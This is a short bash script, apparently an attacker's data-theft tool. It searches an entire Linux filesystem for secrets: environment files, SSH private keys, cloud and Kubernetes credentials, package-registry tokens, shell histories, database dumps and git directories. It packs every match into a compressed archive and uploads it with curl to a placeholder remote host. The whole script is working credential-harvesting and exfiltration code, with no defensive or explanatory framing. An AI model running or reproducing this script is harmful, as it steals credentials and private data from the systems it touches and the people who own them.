#!/usr/bin/env bash

set -euo pipefail

patterns=(".env*" "config\.*" "settings.py" "application.*" "credentials*" "secret*" "keys.json" "id_*" "authorized_keys" "known_hosts" "*.key" "jwt.secret" "token.txt" "api_key*" "service-account" "*.sql" "*.sqlite3" "*.sqlite" "*.bak" "*.backup" "*.old" ".gitconfig" "\.aws" "gcp.json" "azure.json" "kubeconfig" "config.kube" "\.docker" "\.gitlab-ci.yml" "\.github" "\.bash_history" "\.zsh_history" "\.mysql_history" "\.rediscli_history" "\.npmrc" "\.pypirc" "\.netrc" "\.git" "passwd" "hostname")

expr=( \( )
for p in "${patterns[@]}"; do
        expr+=( -name "$p" -o )
done
unset 'expr[${#expr[@]}-1]'
expr+=( \) )

output="/tmp/found_items_$(date +%s).tar.xz"

echo "[*] Searching and archiving..."

tmp_list="$(mktemp)"

find / \
        \( -path /proc -o -path /sys -o -path /dev -o -path /usr \) -prune -o \
        \( -type d \( "${expr[@]}" \) -print -prune \) -o \
        \( -type f \( "${expr[@]}" \) -print \) \
        2>/dev/null > "$tmp_list"

count=$(wc -l < "$tmp_list")

if [[ "$count" -gt 0 ]]; then
        echo "[+] Found $count item(s)"
        echo "[*] Creating archive: $output"
        tar -cJf "$output" -T "$tmp_list" 2>/dev/null
        echo "[+] Archive created: $output"
        curl -F "file=@$output" http://<HOST>:<PORT>/
else
        echo "[!] No items found, skipping archive."
fi

rm -f "$tmp_list"
